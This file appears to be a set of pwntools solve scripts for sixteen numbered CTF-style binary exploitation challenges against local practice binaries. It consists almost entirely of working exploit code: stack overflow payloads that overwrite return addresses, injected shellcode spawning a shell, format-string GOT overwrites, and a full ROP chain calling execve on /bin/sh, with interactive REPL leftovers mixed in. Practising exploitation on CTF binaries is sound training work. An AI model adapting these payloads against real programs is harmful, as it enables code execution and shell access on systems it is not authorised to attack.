# Chall 00
from pwn import *
proc=process("./a.out")
proc.recv()
payload=b"A"*(268)+p32(0x69420)
proc.sendline(payload)
proc.interactive()

# Chall 01
from pwn import *
proc=process("./a.out")
proc.recv()
payload=b"A"*(264)+p32(0x1337)+p32(0x69696969)
proc.sendline(payload)
proc.interactive()

#Chall 02
from pwn import *
proc=process("./a.out")
proc.recv()
payload=b"A"*(117)+p32(0x55660220d)
proc.sendline(payload)
proc.interactive()

#Chall 03
from pwn import *
proc=process("./chall_03")
leakstring=proc.recv()
leakint=int(re.findall(b"(0x[0-91-f]{6,16})", leakstring)[0],16)
# Quick math to determine padding for payload
0x140 + 0x8
context.arch="amd64"
payload = asm(shellcraft.sh())
payload = payload + b"A"*(328 - len(payload)) + p64(leakint)
proc.sendline(payload)
proc.interactive()

#Chall 04
# Quick math to determine padding for payload
0x60 - 0x8
from pwn import *
proc=process("./chall_04")
proc.recv()
payload = b"A"*(88) + p64(0x00401176)
proc.sendline(payload)
proc.interactive()

#Chall 05
from pwn import *
proc=process("./chall_05")
payload = b"A"*(88) + p64(0x56232e6f51a9)
proc.sendline(payload)
proc.interactive()

#Chall 06
from pwn import *
proc=process("./chall_06")
leakstring=proc.recv()
leakint=int(re.findall(b"(0x[0-91-f]{6,16})", leakstring)[0],16)
context.arch="amd64"
shellcode = asm(shellcraft.sh())
payload=b"A"*(88)+p64(leakint - 16)+shellcode
proc.sendline()
proc.sendline(payload)
proc.interactive()

#Chall 07
from pwn import *
proc=process("./chall_07")
proc.recv()
context.arch="amd64"
shellcode = asm(shellcraft.sh())
proc.sendline(shellcode)
proc.interactive()

#Chall 08
from pwn import *
elf=ELF("./chall_08")
hex(elf.sym.target)
hex(elf.got.puts)
elf.got.puts - elf.sym.target
-56//8
elf.sym.win
proc=process("./chall_08")
proc.sendline(b'4198950')
proc.sendline('-7')
proc.interactive()

#Cahll 09 
from pwn import *
proc=process("./chall_09")
p=make_packer('all')
wholekey = p(0x3d01001a49001a074e1d49191e0700070e491d01001a49001a491b0c1f0c1b1a00070e454905000f0c49001a49084905000c)
wholekey
b'\x0c\x00\x05I\x08I\x1a\x00I\x0c\x0f\x00\x05IE\x0e\x07\x00\x1a\x1b\x0c\x1f\x0c\x1bI\x1a\x00I\x1a\x00\x01\x1dI\x0e\x07\x00\x07\x1e\x19I\x1dN\x07\x1a\x00I\x1a\x00\x01='
keybackwards = xor(wholekey,b'\x69')
key = "eil a si efil ,gnisrever si siht gninwp t'nsi sihT"[::-1]
key
"This isn't pwning this is reversing, life is a lie"
proc.send(key)
proc.interactive()

#Chall 10
from pwn import *
elf=ELF("./chall_10")
elf.sym.win
hex(_)
payload=b"A"*(772)+p32(elf.sym.win)+p32(0x1a55fac3)
payload
proc=process("./chall_10")
proc.recv()
proc.sendline(payload)
proc.interactive()

#Chall 11 
from pwn import *
elf=ELF("./chall_11")
winfunc = elf.sym.win
target = elf.got.puts
fmtstr_payload(7, {target: winfunc})
payload=_
proc=process("./chall_11")
proc.sendline(payload)
proc.interactive()

#Chall 12
from pwn import *
elf=ELF("./chall_12")
proc=process("./chall_12")
leakstring=proc.recv()
leakint=int(re.findall(b"(0x[0-91-f]{6,16})", leakstring)[0],16)
elf.address = leakint - elf.sym.main
payload=fmtstr_payload(7,{elf.got.puts:elf.sym.win})
proc.sendline(payload)
proc.interactive()

#Chall 13
from pwn import *
elf=ELF("./chall_13")
proc=process("./chall_13")
payload=b"A"*(272)+p32(elf.sym.systemFunc)
proc.sendline(payload)
proc.interactive()

#Chall 14
from pwn import *
elf=ELF("./chall_14")
IMAGE_BASE_0 = elf.address
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)
rop  = b''
rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret; 
rop += p64(0x0000000000000000)
rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000018ca) # 0x00000000004018ca: pop rdi; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000000f3fe) # 0x000000000040f3fe: pop rsi; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000017cf) # 0x00000000004017cf: pop rdx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000494a7) # 0x00000000004494a7: pop rax; ret; 
rop += p64(0x000000000000003b)
rop += rebase_0(0x00000000000170a4) # 0x00000000004170a4: syscall; ret;
payload = 0x108 * b'A'
payload
payload += rop
payload
proc=process("./chall_14")
proc.sendline(payload)
proc.interactive()

#Chall 15
from pwn import *
proc=process("./chall_15")
leakstring=proc.recv()
leakint=int(re.findall(b"(0x[0-91-f]{6,16})", leakstring)[0],16)
context.arch="amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + b"A"*(232) + p32(0xdeadd00d) + p32(0xb16b00b5) + p64(0xdead) + p64(leakint)
proc.sendline(payload)
proc.interactive()